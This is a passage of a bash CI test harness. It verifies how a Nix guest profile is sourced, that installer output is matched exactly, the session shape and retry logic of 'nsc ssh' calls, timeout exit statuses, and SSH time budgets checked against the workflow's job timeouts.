remote_installer_probe_source='  ./guest-nix-installer --version >"$installer_version_stdout" 2>"$installer_version_stderr"; then'
if ! grep -Fqx -- 'installer_version_stdout=evidence/guest-nix/installer-version.txt' \
  "$production_remote_command" ||
  ! grep -Fqx -- 'installer_version_stderr=evidence/guest-nix/installer-version.stderr' \
    "$production_remote_command" ||
  ! grep -Fqx -- "$remote_installer_probe_source" "$production_remote_command"; then
  fail 'the fixed remote command does not retain raw installer stdout and stderr separately'
fi
! rg -q 'installer_version[[:space:]]*=\$\(' "$production_remote_command" ||
  fail 'the installer version proof regressed to newline-normalizing command substitution'

remote_exact_output_helper=$scratch/guest-nix-exact-output-helper.sh
sed -n '/^guest_nix_exact_output_valid() {$/,/^}$/p' \
  "$production_remote_command" >"$remote_exact_output_helper"
[[ $(grep -c '^guest_nix_exact_output_valid() {$' "$remote_exact_output_helper") == 1 ]] ||
  fail 'the exact installer output helper could not be isolated from the fixed remote command'
# shellcheck source=/dev/null
source "$remote_exact_output_helper"
guest_nix_remote_output_case() {
  local label=${1:?output case required} shape=${2:?output shape required}
  local expect=${3:?output expectation required}
  local stdout_file=$scratch/guest-nix-installer-output-$label.stdout
  local stderr_file=$scratch/guest-nix-installer-output-$label.stderr result=refuse
  : >"$stdout_file"
  : >"$stderr_file"
  case $shape in
    exact) printf '%s\n' 'nix-installer 3.21.9' >"$stdout_file" ;;
    wrong) printf '%s\n' 'nix-installer 3.21.8' >"$stdout_file" ;;
    empty) ;;
    multiline) printf '%s\n%s\n' 'nix-installer 3.21.9' extra >"$stdout_file" ;;
    extra-newline) printf 'nix-installer 3.21.9\n\n' >"$stdout_file" ;;
    stderr)
      printf '%s\n' 'nix-installer 3.21.9' >"$stdout_file"
      printf '%s\n' warning >"$stderr_file"
      ;;
    *) fail "unknown exact installer output shape $shape" ;;
  esac
  if guest_nix_exact_output_valid "$stdout_file" "$stderr_file" \
    'nix-installer 3.21.9' 21; then
    result=accept
  fi
  [[ $result == "$expect" ]] ||
    fail "$label installer output was $result instead of $expect"
}
guest_nix_remote_output_case exact exact accept
guest_nix_remote_output_case wrong wrong refuse
guest_nix_remote_output_case empty empty refuse
guest_nix_remote_output_case multiline multiline refuse
guest_nix_remote_output_case extra-newline extra-newline refuse
guest_nix_remote_output_case stderr stderr refuse

[[ $(grep -c '^guest_nix_source_profile() {$' "$production_remote_command") == 0 ]] ||
  fail 'the fixed remote command retained a post-dot profile helper that can erase source failure'
hostile_guest_nix_profile=$scratch/hostile-guest-nix-profile.sh
# The hostile profile must expand its inherited PATH only when it is sourced.
# shellcheck disable=SC2016
printf '%s\n' 'PATH=/hostile-profile/bin:$PATH' 'export PATH' 'return 23' \
  >"$hostile_guest_nix_profile"

remote_profile_resolution_line=$(rg -n '^guest_nix_profile_resolved=\$\(readlink -f ' \
  "$production_remote_command" | cut -d: -f1)
remote_profile_suffix_line=$(rg -n '^  /nix/store/\*/etc/profile\.d/nix-daemon\.sh\) ;;$' \
  "$production_remote_command" | cut -d: -f1)
remote_profile_validation_line=$(rg -n '^\[ -f "\$guest_nix_profile" \] && \[ -r "\$guest_nix_profile" \] \|\|$' \
  "$production_remote_command" | cut -d: -f1)
remote_profile_unsafe_refusal_line=$(rg -n \
  "^    'the exact guest Nix profile is absent, unreadable, or not a regular file'$" \
  "$production_remote_command" | cut -d: -f1)
remote_stage2_open_line=$(rg -n -F "guest_nix_stage2=\$(cat <<'GUEST_NIX_STAGE2'" \
  "$production_remote_command" | cut -d: -f1)
remote_stage2_close_line=$(rg -n '^GUEST_NIX_STAGE2$' \
  "$production_remote_command" | cut -d: -f1)
remote_stage1_open_line=$(rg -n -F "guest_nix_stage1_head=\$(cat <<'GUEST_NIX_STAGE1'" \
  "$production_remote_command" | cut -d: -f1)
remote_profile_line=$(rg -n '^\. "\$guest_nix_profile"$' \
  "$production_remote_command" | cut -d: -f1)
remote_profile_status_line=$(rg -n '^guest_nix_profile_rc=\$\?$' \
  "$production_remote_command" | cut -d: -f1)
remote_stage1_close_line=$(rg -n '^GUEST_NIX_STAGE1$' \
  "$production_remote_command" | cut -d: -f1)
remote_outer_exec_line=$(rg -n \
  '^exec /bin/sh -c "\$guest_nix_stage1" guest-nix-stage1 "\$guest_nix_profile"$' \
  "$production_remote_command" | cut -d: -f1)
remote_profile_refusal_line=$(rg -n \
  '^  guest_nix_fail GuestNixProfileSourceFailed "the exact guest Nix profile returned nonzero while being sourced"$' \
  "$production_remote_command" | cut -d: -f1)
remote_develop_line=$(rg -n '^exec /nix/var/nix/profiles/default/bin/nix .* develop ' \
  "$production_remote_command" | cut -d: -f1)
remote_user_conf_line=$(rg -n '^NIX_USER_CONF_FILES=/run/diene-ci/nix-user\.conf$' \
  "$production_remote_command" | cut -d: -f1)
for remote_boundary in "$remote_profile_resolution_line" "$remote_profile_suffix_line" \
  "$remote_profile_validation_line" "$remote_profile_unsafe_refusal_line" \
  "$remote_stage2_open_line" "$remote_stage2_close_line" "$remote_stage1_open_line" \
  "$remote_profile_line" "$remote_profile_status_line" "$remote_stage1_close_line" \
  "$remote_outer_exec_line" "$remote_profile_refusal_line" "$remote_user_conf_line" \
  "$remote_develop_line"; do
  [[ $remote_boundary =~ ^[1-9][0-9]*$ ]] ||
    fail 'a fixed remote profile/develop boundary is absent or ambiguous'
done
[[ $remote_profile_resolution_line -lt $remote_profile_suffix_line &&
  $remote_profile_suffix_line -lt $remote_profile_validation_line &&
  $remote_profile_validation_line -lt $remote_profile_unsafe_refusal_line &&
  $remote_profile_unsafe_refusal_line -lt $remote_stage2_open_line &&
  $remote_stage2_open_line -lt $remote_profile_refusal_line &&
  $remote_profile_refusal_line -lt $remote_user_conf_line &&
  $remote_user_conf_line -lt $remote_develop_line &&
  $remote_develop_line -lt $remote_stage2_close_line &&
  $remote_stage2_close_line -lt $remote_stage1_open_line &&
  $remote_stage1_open_line -lt $remote_profile_line &&
  $remote_profile_line -lt $remote_profile_status_line &&
  $remote_profile_status_line -lt $remote_stage1_close_line &&
  $remote_stage1_close_line -lt $remote_outer_exec_line ]] ||
  fail 'the fixed remote command does not isolate profile sourcing from the pristine develop stage'
[[ $remote_profile_status_line -eq $((remote_profile_line + 1)) &&
  $remote_stage1_close_line -eq $((remote_profile_status_line + 1)) ]] ||
  fail 'stage 1 runs a bare command after sourcing instead of only capturing the profile status'

remote_stage2_body=$scratch/guest-nix-stage2-body.sh
sed -n "$((remote_stage2_open_line + 1)),$((remote_stage2_close_line - 1))p" \
  "$production_remote_command" >"$remote_stage2_body"
if grep -Fq "'" "$remote_stage2_body"; then
  fail 'the stage-2 program contains a single quote and cannot remain one fixed stage-1 word'
fi

mapfile -t remote_hash_helper_lines < <(
  rg -n '^guest_nix_hash_etc_config\(\) \{$' "$production_remote_command" |
    cut -d: -f1
)
[[ ${#remote_hash_helper_lines[@]} == 2 ]] ||
  fail 'the fixed remote command does not contain exactly two Nix configuration hash helpers'
remote_hash_helper_one_end=$(awk -v start="${remote_hash_helper_lines[0]}" \
  'NR > start && $0 == "}" { print NR; exit }' "$production_remote_command")
remote_hash_helper_two_end=$(awk -v start="${remote_hash_helper_lines[1]}" \
  'NR > start && $0 == "}" { print NR; exit }' "$production_remote_command")
[[ $remote_hash_helper_one_end =~ ^[1-9][0-9]*$ &&
  $remote_hash_helper_two_end =~ ^[1-9][0-9]*$ ]] ||
  fail 'a Nix configuration hash helper has no exact closing boundary'
sed -n "${remote_hash_helper_lines[0]},${remote_hash_helper_one_end}p" \
  "$production_remote_command" >"$scratch/guest-nix-hash-helper-one.sh"
sed -n "${remote_hash_helper_lines[1]},${remote_hash_helper_two_end}p" \
  "$production_remote_command" >"$scratch/guest-nix-hash-helper-two.sh"
cmp -s "$scratch/guest-nix-hash-helper-one.sh" \
  "$scratch/guest-nix-hash-helper-two.sh" ||
  fail 'the pristine-stage Nix configuration hash helper diverged from its pre-profile definition'
ok 'the stage handoff has no post-dot command seam, quote seam, or divergent hash helper'

profile_refusal_marker=$scratch/guest-nix-host-profile-protected-mutation
profile_refusal_rc=0
if (
  # shellcheck source=/dev/null
  source "$template_root/scripts/ci/environment-lib.sh"
  diene_source_guest_nix_profile "$hostile_guest_nix_profile" "$scratch"
  : >"$profile_refusal_marker"
) >"$scratch/guest-nix-host-profile.out" 2>"$scratch/guest-nix-host-profile.err"; then
  fail 'the shared profile verifier accepted a nonzero source result'
else
  profile_refusal_rc=$?
fi
[[ $profile_refusal_rc == 64 ]] ||
  fail "the shared profile verifier did not exit 64 (got $profile_refusal_rc)"
grep -Fq -- 'GuestNixProfileSourceFailed:' "$scratch/guest-nix-host-profile.err" ||
  fail 'the shared profile verifier emitted no stable profile-source refusal'
[[ ! -e $profile_refusal_marker ]] ||
  fail 'a failed profile source reached a protected mutation'

shared_profile_safety_case() {
  local label=${1:?profile safety label required} profile=${2:?profile path required} rc=0
  if (
    # shellcheck source=/dev/null
    source "$template_root/scripts/ci/environment-lib.sh"
    diene_source_guest_nix_profile "$profile" "$scratch"
    : >"$scratch/guest-nix-profile-$label.mutation"
  ) >"$scratch/guest-nix-profile-$label.out" 2>"$scratch/guest-nix-profile-$label.err"; then
    fail "the $label mandatory guest Nix profile unexpectedly passed"
  else
    rc=$?
  fi
  [[ $rc == 64 ]] || fail "the $label mandatory guest Nix profile did not exit 64"
  assert_contains "$scratch/guest-nix-profile-$label.err" GuestNixIdentityUnexpected
  [[ ! -e $scratch/guest-nix-profile-$label.mutation ]] ||
    fail "the $label mandatory guest Nix profile reached a protected mutation"
}
missing_guest_nix_profile=$scratch/missing-guest-nix-profile.sh
shared_profile_safety_case missing "$missing_guest_nix_profile"
fake_guest_nix_profile_target=$scratch/fake-guest-nix-profile-target.sh
fake_guest_nix_profile_link=$scratch/fake-guest-nix-profile-link.sh
printf '%s\n' 'return 0' >"$fake_guest_nix_profile_target"
ln -s "$fake_guest_nix_profile_target" "$fake_guest_nix_profile_link"
(
  # shellcheck source=/dev/null
  source "$template_root/scripts/ci/environment-lib.sh"
  diene_source_guest_nix_profile "$fake_guest_nix_profile_link" "$scratch"
) || fail 'the explicit fake-profile test-root seam refused its safe in-root profile'
ok 'raw installer bytes and mandatory curated profile sourcing are proved before install or develop'

nix_guard_binding_root=$scratch/nix-guard-binding
install -d -m 0700 "$nix_guard_binding_root/instances/cluster-0000000000000000/fs"
: >"$nix_guard_binding_root/instances/cluster-0000000000000000/live"
nix_guard_binding_rc=0
FAKE_NSC_ROOT=$nix_guard_binding_root FAKE_NSC_LOG=$nix_guard_binding_root/log \
  FAKE_GUEST_NIX_GUARD=$guest_nix_guard FAKE_GUEST_BIN=$fake_guest \
  "$fake_nsc" ssh cluster-0000000000000000 -T -- \
  'set -eu; sha256sum -c archive-validator.sha256; ./archive-validator.sh source.tar source; exec nix develop' \
  >/dev/null 2>&1 || nix_guard_binding_rc=$?
[[ $nix_guard_binding_rc == 69 ]] ||
  fail 'the fake ssh leg does not bind the fixed guest nix guard to production text'
ok 'the fixed rail preserves GuestNixToolchainAbsent while admitting only exact direct-binary pins'

# The ruled session shape carries both properties at once: -T selects no pseudo
# terminal, and -- ends option parsing so the reviewed program can never be
# re-read as an nsc flag. Either property alone is a shape the ruling forbids.
nix_guard_session_shape_case() {
  local label=${1:?session shape label required} rc=0
  shift
  FAKE_NSC_ROOT=$nix_guard_binding_root FAKE_NSC_LOG=$nix_guard_binding_root/log \
    FAKE_GUEST_NIX_GUARD=$guest_nix_guard FAKE_GUEST_BIN=$fake_guest \
    "$fake_nsc" ssh cluster-0000000000000000 "$@" >/dev/null 2>&1 || rc=$?
  [[ $rc == 127 || $rc == 66 ]] ||
    fail "the fake ssh leg admitted the forbidden $label session shape (rc $rc)"
}
nix_guard_session_shape_case 'unseparated -T' -T 'set -eu; exec nix develop'
nix_guard_session_shape_case 'separator without -T' -- 'set -eu; exec nix develop'
nix_guard_session_shape_case 'interactive pty' -t -- 'set -eu; exec nix develop'
nix_guard_session_shape_case 'reversed separator' -- -T 'set -eu; exec nix develop'
nix_guard_session_shape_case 'bare positional command' 'set -eu; exec nix develop'
ok 'the fake nsc ssh leg admits only the noninteractive double-dash-separated session shape'

# The driver leg is one bounded noninteractive separated session per attempt.
# These gates bind the shape: a hard timeout exists, the session is `-T --`
# separated, stdin is closed, the budget is not ambient, and the phase digest
# carries the attempt trace. The wall-clock constants themselves -- the 30s and
# 120s start watchdogs and the per-lane aggregate budgets -- are bound further
# below, against the workflow job timeouts they are sized from.
ssh_leg_source=$template_root/scripts/ci/environment-k3d-run.sh
mapfile -t ssh_leg_calls < <(rg -N 'nsc_bin" ssh ' "$guest_nix_production_normalized" || true)
[[ ${#ssh_leg_calls[@]} == 1 ]] ||
  fail 'production text does not contain exactly one nsc ssh driver call site'
ssh_leg_call=$(tr -s ' ' <<<"${ssh_leg_calls[0]}")
ssh_leg_call=${ssh_leg_call# }
# The tokens are production source text and must stay unexpanded here.
# shellcheck disable=SC2016
for ssh_leg_token in 'timeout ' '"$nsc_bin" ssh "$ORCH_CLUSTER_ID" -T -- "$remote_command"' \
  '</dev/null' '>"$attempt_stdout"' '2>"$attempt_stderr"'; do
  [[ $ssh_leg_call == *"$ssh_leg_token"* ]] ||
    fail "the driver ssh leg lost a required element: $ssh_leg_token"
done
# Each attempt writes to its own private file and is folded into the shared
# staging streams exactly once, by a helper that latches. Binding the private
# redirection alone would lose the append-once property, so bind both: the
# attempt files are created mode 0600, and the flush is guarded by a latch it
# sets itself, appends rather than truncates, and is what the stop path calls.
# The seams are production source text and must stay unexpanded.
# shellcheck disable=SC2016
for ssh_leg_flush_seam in 'chmod 0600 "$attempt_stdout" "$attempt_stderr"' \
  '((ORCH_SSH_ACTIVE_EVIDENCE_FLUSHED == 0)) || return 0' \
  'cat -- "$ORCH_SSH_ACTIVE_STDOUT" >>"$DIENE_EVIDENCE_STAGING/stdout"' \
  'cat -- "$ORCH_SSH_ACTIVE_STDERR" >>"$DIENE_EVIDENCE_STAGING/stderr"' \
  'ORCH_SSH_ACTIVE_EVIDENCE_FLUSHED=1'; do
  rg -qF -- "$ssh_leg_flush_seam" "$ssh_leg_source" ||
    fail "the append-once attempt evidence flush lost a required seam: $ssh_leg_flush_seam"
done
[[ $(rg -Nc -- 'orchestrator_flush_active_ssh_evidence' "$ssh_leg_source") -ge 3 ]] ||
  fail 'the attempt evidence flush is not reached from both the attempt and the stop paths'
rg -qF -- 'orchestrator_flush_active_ssh_evidence || true' "$ssh_leg_source" ||
  fail 'the stop path does not flush partial attempt evidence'
# A truncating fold would silently discard the earlier attempt's evidence.
if rg -n -e '>"\$DIENE_EVIDENCE_STAGING/(stdout|stderr)"' "$ssh_leg_source" |
  rg -v -e '>>"\$DIENE_EVIDENCE_STAGING/' >"$scratch/ssh-leg-truncating-fold"; then
  sed -n '1,40p' "$scratch/ssh-leg-truncating-fold" >&2
  fail 'attempt evidence is folded into staging with a truncating redirection'
fi
[[ $ssh_leg_call == timeout\ * ]] ||
  fail 'the driver ssh leg is not wrapped in a hard timeout'
for ssh_leg_mutant in \
  "unbounded|${ssh_leg_call#timeout *}" \
  "positional-command|${ssh_leg_call/-T -- /-T }" \
  "inherited-stdin|${ssh_leg_call/ <\/dev\/null/}" \
  "interactive-session|${ssh_leg_call/-T --/-t --}"; do
  ssh_leg_mutant_label=${ssh_leg_mutant%%|*}
  [[ ${ssh_leg_mutant#*|} != "$ssh_leg_call" ]] ||
    fail "the $ssh_leg_mutant_label ssh leg mutant did not change the reviewed call"
done
# Every external helper the bounded ssh leg depends on must be proven present
# before any instance exists, so a missing helper is a cheap pre-create refusal
# rather than a live instance stranded mid-leg. The fake nsc can mask these
# commands, so the ruling admits a static ordering proof: each require must
# appear before the state directory is bound and before the create array runs.
ssh_leg_state_line=$(rg -n -F -- 'ORCH_STATE="${RUNNER_TEMP:?}/diene-namespace/$ORCH_RECEIPT_ID"' \
  "$ssh_leg_source" | head -1 | cut -d: -f1)
ssh_leg_create_line=$(rg -n -F -- 'local -a create=("$nsc_bin" create --ephemeral' \
  "$ssh_leg_source" | head -1 | cut -d: -f1)
[[ $ssh_leg_state_line =~ ^[1-9][0-9]*$ && $ssh_leg_create_line =~ ^[1-9][0-9]*$ &&
  $ssh_leg_state_line -lt $ssh_leg_create_line ]] ||
  fail 'the pre-create state and create boundaries are absent or misordered'
for ssh_leg_helper in wc cmp sleep timeout; do
  ssh_leg_helper_lines=$(rg -Nc -- "^  diene_require_command $ssh_leg_helper\$" "$ssh_leg_source" ||
    printf 0)
  [[ $ssh_leg_helper_lines == 1 ]] ||
    fail "the ssh leg helper $ssh_leg_helper is not required exactly once before create"
  ssh_leg_helper_line=$(rg -n -- "^  diene_require_command $ssh_leg_helper\$" \
    "$ssh_leg_source" | head -1 | cut -d: -f1)
  [[ $ssh_leg_helper_line -lt $ssh_leg_state_line ]] ||
    fail "the ssh leg helper $ssh_leg_helper is required only after the state directory is bound"
  [[ $ssh_leg_helper_line -lt $ssh_leg_create_line ]] ||
    fail "the ssh leg helper $ssh_leg_helper is required only after nsc create"
done
ok 'wc, cmp, sleep, and timeout are each required exactly once before state binding and create'
rg -qF -- 'ORCH_SSH_DIGEST=$(phase_digest ssh "$ORCH_CLUSTER_ID" "$ssh_attempt_trace")' \
  "$ssh_leg_source" ||
  fail 'the ssh phase digest does not bind the exact cluster and its attempt trace'
if rg -n 'DIENE_NSC_SSH_TIMEOUT|DIENE_SSH_TIMEOUT|DIENE_NSC_SSH_ATTEMPTS|DIENE_SSH_ATTEMPTS' \
  "$guest_nix_production_normalized" >"$scratch/ssh-leg-ambient"; then
  sed -n '1,40p' "$scratch/ssh-leg-ambient" >&2
  fail 'the ssh timeout or attempt budget acquired an ambient environment override'
fi
# A retry must never become a second instance: no create, no recreate helper,
# and no readiness ordinal may appear inside the reviewed retry loop.
ssh_leg_loop=$(awk '/^  for ssh_attempt in /{inside=1} inside; /^  done$/{if (inside) exit}' \
  "$ssh_leg_source")
[[ -n $ssh_leg_loop ]] || fail 'the bounded ssh retry loop could not be isolated'
for ssh_leg_forbidden in 'create' 'orchestrator_create' 'sleep' 'readiness' 'ordinal'; do
  [[ $ssh_leg_loop != *"$ssh_leg_forbidden"* ]] ||
    fail "the bounded ssh retry loop contains a forbidden $ssh_leg_forbidden step"
done
ok 'the driver ssh leg is one bounded separated session whose retry adds no create, sleep, or ordinal'

# Prove the hard-timeout mechanism really produces the two statuses the retry
# keys on, so the classifier is bound to measured behaviour, not to belief.
ssh_leg_signature_rc=0
timeout --foreground --kill-after=5s 1s sleep 30 >/dev/null 2>&1 || ssh_leg_signature_rc=$?
[[ $ssh_leg_signature_rc == 124 ]] ||
  fail "a hard timeout did not yield the 124 retry signature (got $ssh_leg_signature_rc)"
ssh_leg_stubborn=$scratch/ssh-leg-stubborn.sh
printf '%s\n' '#!/bin/sh' 'trap "" TERM' 'sleep 30' >"$ssh_leg_stubborn"
chmod 0755 "$ssh_leg_stubborn"
ssh_leg_signature_rc=0
timeout --foreground --kill-after=1s 1s "$ssh_leg_stubborn" >/dev/null 2>&1 ||
  ssh_leg_signature_rc=$?
[[ $ssh_leg_signature_rc == 137 ]] ||
  fail "a hard kill-after did not yield the 137 retry signature (got $ssh_leg_signature_rc)"
ok 'the hard-timeout mechanism empirically produces both the 124 and 137 retry signatures'

# Cancellation depends on a mechanism, not on a belief: an EXTERNAL signal
# delivered to a tracked background timeout must also arm the fixed kill-after
# convergence and leave no surviving child, or the stop helper can hang forever
# on a command that ignores TERM.
ssh_leg_external_marker=$scratch/ssh-leg-external.marker
ssh_leg_external_child=$scratch/ssh-leg-external-child.sh
{
  printf '%s\n' '#!/bin/sh' 'trap "" TERM'
  printf 'printf %%s "$$" >%s\n' "$ssh_leg_external_marker"
  printf '%s\n' 'sleep 300'
} >"$ssh_leg_external_child"
chmod 0755 "$ssh_leg_external_child"
rm -f -- "$ssh_leg_external_marker"
timeout --foreground --kill-after=2s 600s "$ssh_leg_external_child" >/dev/null 2>&1 &
ssh_leg_external_pid=$!
ssh_leg_external_waited=0
while [[ ! -s $ssh_leg_external_marker && $ssh_leg_external_waited -lt 50 ]]; do
  ssh_leg_external_waited=$((ssh_leg_external_waited + 1))
  sleep 0.1
done
[[ -s $ssh_leg_external_marker ]] ||
  fail 'the external-signal convergence probe never started its TERM-ignoring child'
ssh_leg_external_child_pid=$(cat "$ssh_leg_external_marker")
kill -TERM "$ssh_leg_external_pid"
ssh_leg_signature_rc=0
wait "$ssh_leg_external_pid" || ssh_leg_signature_rc=$?
[[ $ssh_leg_signature_rc == 137 ]] ||
  fail "an external TERM to the tracked timeout did not converge at 137 (got $ssh_leg_signature_rc)"
ssh_leg_external_waited=0
while kill -0 "$ssh_leg_external_child_pid" 2>/dev/null &&
  [[ $ssh_leg_external_waited -lt 50 ]]; do
  ssh_leg_external_waited=$((ssh_leg_external_waited + 1))
  sleep 0.1
done
! kill -0 "$ssh_leg_external_child_pid" 2>/dev/null ||
  fail 'the external-signal convergence left the TERM-ignoring child alive'
ok 'an external signal to the tracked timeout converges at 137 and leaves no surviving child'

# The aggregate SSH-leg budget is one deadline covering both start watchdogs,
# both reaps, and all marked driver runtime. The reserve is therefore counted
# exactly once: budget + 15m must fit the lane's declared job timeout, and the
# watchdog windows must NOT be added on top again. The job timeouts are read
# out of the reusable workflow rather than from a second copy of the numbers,
# so the table cannot drift away from the jobs it is sized against.
ssh_leg_reusable_workflow=$template_root/.github/workflows/⚡reusable-environment-k3d.yaml
ssh_leg_reserve_minutes=15
ssh_leg_lane_budgets=(
  'environment-fleet-independence|fleet-independence|2700'
  'environment-ditto-build-local|ditto-build-local|3600'
  'environment-ditto-target-pull|ditto-target-pull|3600'
  'environment-ditto-vendor|ditto-vendor|4500'
  'environment-absol|absol|6300'
)
for ssh_leg_lane_budget in "${ssh_leg_lane_budgets[@]}"; do
  IFS='|' read -r ssh_leg_job ssh_leg_lane ssh_leg_budget <<<"$ssh_leg_lane_budget"
  # The jq path is a yq program, not shell.
  # shellcheck disable=SC2016
  ssh_leg_job_timeout=$(ssh_leg_job=$ssh_leg_job yq -r \
    '.jobs[strenv(ssh_leg_job)]["timeout-minutes"]' "$ssh_leg_reusable_workflow")
  [[ $ssh_leg_job_timeout =~ ^[1-9][0-9]*$ ]] ||
    fail "the $ssh_leg_job job declares no numeric timeout to size the ssh leg against"
  ((ssh_leg_budget % 60 == 0)) ||
    fail "the $ssh_leg_lane aggregate ssh budget is not a whole number of minutes"
  [[ $((ssh_leg_budget / 60 + ssh_leg_reserve_minutes)) == "$ssh_leg_job_timeout" ]] ||
    fail "the $ssh_leg_lane aggregate ssh budget plus the ${ssh_leg_reserve_minutes}m reserve is not its ${ssh_leg_job_timeout}m job timeout"
  ssh_leg_production_budget=$(
    # shellcheck source=/dev/null
    source "$template_root/scripts/ci/environment-k3d-run.sh" >/dev/null 2>&1 || true
    DIENE_LANE=$ssh_leg_lane orchestrator_ssh_leg_budget_seconds
  ) || fail "production exposes no aggregate ssh budget for $ssh_leg_lane"
  [[ $ssh_leg_production_budget == "$ssh_leg_budget" ]] ||
    fail "production sizes the $ssh_leg_lane aggregate ssh budget at $ssh_leg_production_budget, not $ssh_leg_budget"
done
# Adding the start watchdogs on top of the aggregate budget would double-count
# the reserve; the widest lane must still fit with the reserve counted once.
[[ $((6300 / 60 + ssh_leg_reserve_minutes)) == 120 ]] ||
  fail 'the widest aggregate ssh budget no longer fits its job timeout with one reserve'
ok 'every lane aggregate ssh budget plus one fifteen-minute reserve is exactly its job timeout'

# Asymmetric start windows, drawn from and capped by the one aggregate deadline.
# The seams are production source text and must stay unexpanded.
# shellcheck disable=SC2016
for ssh_leg_seam in 'ssh_leg_deadline=$((SECONDS + ssh_leg_budget_seconds))' \
  'ssh_remaining_seconds=$((ssh_leg_deadline - SECONDS))' \
  'timeout --foreground --kill-after=10s "${remaining_seconds}s"' \
  'DieneNscSshSessionReady:v1'; do
  rg -qF -- "$ssh_leg_seam" "$ssh_leg_source" ||
    fail "the aggregate ssh leg lost a required seam: $ssh_leg_seam"
done
[[ $(rg -Nc -- 'ssh_leg_deadline=\$\(\(SECONDS \+ ssh_leg_budget_seconds\)\)' \
  "$ssh_leg_source") == 1 ]] ||
  fail 'the aggregate ssh deadline is computed more than once, so attempt 2 can be refreshed'
for ssh_leg_window in 30 120; do
  rg -qF -- "$ssh_leg_window" "$ssh_leg_source" ||
    fail "the ${ssh_leg_window}s asymmetric start watchdog is absent"
done
ok 'the ssh leg draws asymmetric start windows from exactly one aggregate deadline'

# Real lane budgets (2700s and up) always exceed the combined 150s watchdog
# surface, so the capped path can never be reached through a lane. Prove it
# statically, and then directly, with a synthetic remainder.
# The seams are production source text and must stay unexpanded.
# shellcheck disable=SC2034,SC2016
for ssh_leg_cap_seam in 'if ((ssh_watchdog_seconds > ssh_remaining_seconds)); then' \
  'ssh_watchdog_seconds=$ssh_remaining_seconds' \
  'if ((ssh_remaining_seconds <= 0)); then' \
  'watchdog_stopped'; do
  rg -qF -- "$ssh_leg_cap_seam" "$ssh_leg_source" ||
    fail "the aggregate ssh leg lost its remainder-capping seam: $ssh_leg_cap_seam"
done
# A watchdog-forced stop must freeze the attempt unready; only the pre-stop
# boundary scan may admit a last-poll marker.
rg -qF -- 'watchdog_stopped=true' "$ssh_leg_source" ||
  fail 'the ssh leg never records that a stop was watchdog-forced'
# The observation and the decision are separate concerns. The post-reap
# first-line scan must run and be STORED on every branch, including frozen
# ones, so the evidence exists; only the readiness upgrade may be gated. A
# harness that bound the gate alone would let the scan itself be skipped.
# The post-reap scan is the only one at function indent; the earlier two are
# inside the poll loop and the pre-stop boundary, both nested deeper.
[[ $(rg -Nc -- '^  if orchestrator_ssh_ready_marker_seen "\$attempt_stdout"; then$' \
  "$ssh_leg_source") == 1 ]] ||
  fail 'the post-reap first-line scan is not a single unambiguous statement'
ssh_leg_final_scan=$(awk '
  /^  if orchestrator_ssh_ready_marker_seen "\$attempt_stdout"; then$/ { inside = 1 }
  inside { print }
  inside && /^  fi$/ { exit }' "$ssh_leg_source")
[[ $ssh_leg_final_scan == *'final_marker_seen=true'* ]] ||
  fail 'the post-reap first-line scan does not store its observation unconditionally'
[[ $ssh_leg_final_scan != *watchdog_stopped* &&
  $ssh_leg_final_scan != *capped_timeout_reaped* ]] ||
  fail 'the post-reap first-line scan is itself skipped on a frozen branch'
[[ $(rg -Nc -- 'final_marker_seen=true' "$ssh_leg_source") == 1 ]] ||
  fail 'the stored post-reap observation is written from more than one place'
# Two distinct freeze causes, and the upgrade must require the absence of both.
# An active watchdog stop canonicalizes the status to 124; a capped boundary
# that only became visible after reap must NOT rewrite the real 124/137 it
# already carries, or the trace would stop distinguishing the two.
rg -qF -- 'if [[ $watchdog_stopped != true && $capped_timeout_reaped != true &&' \
  "$ssh_leg_source" ||
  fail 'the readiness upgrade does not require the absence of both freeze causes'
for ssh_leg_freeze_cause in watchdog_stopped capped_timeout_reaped; do
  [[ $(rg -Nc -- "^  local .*$ssh_leg_freeze_cause=false" "$ssh_leg_source" ||
    printf 0) -ge 1 ]] ||
    fail "the ssh leg freeze cause $ssh_leg_freeze_cause is not initialised false"
  [[ $(rg -Nc -- "$ssh_leg_freeze_cause=true" "$ssh_leg_source") == 1 ]] ||
    fail "the ssh leg freeze cause $ssh_leg_freeze_cause is set from more than one place"
done
ssh_leg_canonicalize=$(awk '
  /^  if \[\[ \$watchdog_stopped == true \]\]; then$/ { inside = 1 }
  inside { print }
  inside && /^  fi$/ { exit }' "$ssh_leg_source")
[[ $ssh_leg_canonicalize == *'rc=124'* ]] ||
  fail 'an active watchdog stop does not canonicalize the attempt status'
[[ $ssh_leg_canonicalize != *capped_timeout_reaped* ]] ||
  fail 'a capped reaped timeout rewrites the exact status it already carried'

ssh_leg_attempt_case() {
  local label=${1:?attempt label required} child=${2:?child behaviour required}
  local remaining=${3:?aggregate remainder required} watchdog=${4:?watchdog seconds required}
  local expect_ready=${5:?readiness required} expect_rc=${6:?status required}
  local root=$scratch/ssh-leg-attempt-$label
  install -d -m 0700 "$root/state" "$root/staging"
  local fake_nsc_bin=$root/nsc
  case $child in
    unmarked-hang)
      printf '%s\n' '#!/usr/bin/env bash' 'sleep 120' >"$fake_nsc_bin"
      ;;
    marked-fast)
      printf '%s\n' '#!/usr/bin/env bash' \
        "printf '%s\\n' 'DieneNscSshSessionReady:v1'" 'exit 0' >"$fake_nsc_bin"
      ;;
    late-marker)
      printf '%s\n' '#!/usr/bin/env bash' \
        "trap 'printf \"%s\\n\" \"DieneNscSshSessionReady:v1\"; exit 124' TERM" \
        'sleep 120 &' 'wait $! || true' 'exit 0' >"$fake_nsc_bin"
      ;;
    marked-between-polls)
      # Alive through the initial scan, then a genuine self-directed exit with
      # the marker, strictly before the shared one-second boundary. Nothing
      # kills this child, so the voluntary-exit final scan must admit it.
      printf '%s\n' '#!/usr/bin/env bash' 'sleep 0.3' \
        "printf '%s\\n' 'DieneNscSshSessionReady:v1'" 'exit 0' >"$fake_nsc_bin"
      ;;
    *) fail "unknown ssh leg attempt child $child" ;;
  esac
  chmod 0755 "$fake_nsc_bin"
  # The globals are consumed by the sourced production function.
  # shellcheck disable=SC2034
  local observed
  observed=$(
    # shellcheck source=/dev/null
    source "$ssh_leg_source" >/dev/null 2>&1 || true
    # These globals are read by the sourced production attempt function.
    # shellcheck disable=SC2034
    ORCH_STATE=$root/state
    # shellcheck disable=SC2034
    ORCH_CLUSTER_ID='cluster-000000000000cafe'
    DIENE_EVIDENCE_STAGING=$root/staging
    : >"$DIENE_EVIDENCE_STAGING/stdout"
    : >"$DIENE_EVIDENCE_STAGING/stderr"
    orchestrator_run_ssh_attempt "$fake_nsc_bin" 'true' 1 "$remaining" "$watchdog"
